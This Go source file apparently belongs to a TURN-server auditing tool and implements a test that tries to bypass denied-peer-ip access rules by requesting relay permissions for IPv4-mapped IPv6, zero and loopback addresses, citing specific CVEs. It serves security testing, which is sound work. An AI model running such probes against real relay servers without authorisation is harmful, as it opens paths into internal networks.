// Copyright 2025 Praetorian Security, Inc.
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package audit

import (
	"fmt"
	"net"

	"github.com/pion/stun"
	"github.com/praetorian-inc/turnt/internal/turn"
)

// BypassResult contains the result of an ACL bypass test.
type BypassResult struct {
	Results    []ScanResult
	BypassFound bool
}

// TestACLBypass tests whether denied-peer-ip rules can be bypassed using
// alternative address representations. Compares direct IPv4 access against
// IPv4-mapped IPv6, zero addresses, and IPv6 loopback.
func TestACLBypass(serverAddr, protocol, username, password string, targetIP string, port int) (*BypassResult, error) {
	client, err := turn.NewClient(turn.ClientConfig{
		ServerAddr: serverAddr,
		Protocol:   protocol,
		Username:   username,
		Password:   password,
	})
	if err != nil {
		return nil, fmt.Errorf("connect: %w", err)
	}
	defer client.Close()

	// Learn auth params and allocate
	if err := client.LearnAuthParams(); err != nil {
		return nil, fmt.Errorf("learn auth: %w", err)
	}

	allocResp, err := client.SendAuthenticatedAllocate()
	if err != nil {
		return nil, fmt.Errorf("allocate: %w", err)
	}
	if allocResp.Type.Class != stun.ClassSuccessResponse {
		code, reason, _ := turn.ParseErrorCode(allocResp)
		return nil, fmt.Errorf("allocate failed: %d %s", code, reason)
	}

	result := &BypassResult{}

	// Test 1: Direct IPv4 (baseline)
	directResult := probeAddress(client, net.ParseIP(targetIP), port, false)
	directResult.Label = "Direct IPv4"
	directResult.Address = targetIP
	result.Results = append(result.Results, directResult)

	// Test 2: IPv4-mapped IPv6 (CVE-2026-27624)
	mappedResult := probeAddress(client, net.ParseIP(targetIP), port, true)
	mappedResult.Label = "IPv4-mapped IPv6 (::ffff:)"
	mappedResult.Address = fmt.Sprintf("::ffff:%s", targetIP)
	result.Results = append(result.Results, mappedResult)

	// Test 3: 0.0.0.0 (CVE-2020-26262, resolves to localhost on Linux)
	zeroResult := probeAddress(client, net.ParseIP("0.0.0.0"), port, false)
	zeroResult.Label = "Zero address (CVE-2020-26262)"
	zeroResult.Address = "0.0.0.0"
	result.Results = append(result.Results, zeroResult)

	// Test 4: :: (IPv6 any)
	ipv6AnyResult := probeAddress(client, net.IPv6zero, port, false)
	ipv6AnyResult.Label = "IPv6 any (::)"
	ipv6AnyResult.Address = "::"
	result.Results = append(result.Results, ipv6AnyResult)

	// Test 5: ::1 (IPv6 loopback)
	ipv6LoopResult := probeAddress(client, net.IPv6loopback, port, false)
	ipv6LoopResult.Label = "IPv6 loopback (::1)"
	ipv6LoopResult.Address = "::1"
	result.Results = append(result.Results, ipv6LoopResult)

	// Detect bypass: any alternative representation allowed when direct is denied
	directDenied := !directResult.Allowed
	for _, r := range result.Results[1:] {
		if r.Allowed && directDenied {
			result.BypassFound = true
			break
		}
	}

	// Deallocate
	client.SendRefresh(0)

	return result, nil
}

func probeAddress(client *turn.Client, ip net.IP, port int, forceIPv6 bool) ScanResult {
	var resp *stun.Message
	var err error

	if forceIPv6 {
		resp, err = client.SendCreatePermissionIPv6Explicit(ip, port)
	} else {
		resp, err = client.SendCreatePermission(ip, port)
	}

	result := ScanResult{}
	if err != nil {
		result.Allowed = false
		result.Error = err.Error()
		return result
	}

	if resp.Type.Class == stun.ClassSuccessResponse {
		result.Allowed = true
	} else if resp.Type.Class == stun.ClassErrorResponse {
		code, reason, _ := turn.ParseErrorCode(resp)
		result.Allowed = false
		result.ErrCode = code
		result.Error = fmt.Sprintf("%d %s", code, reason)
	}

	return result
}
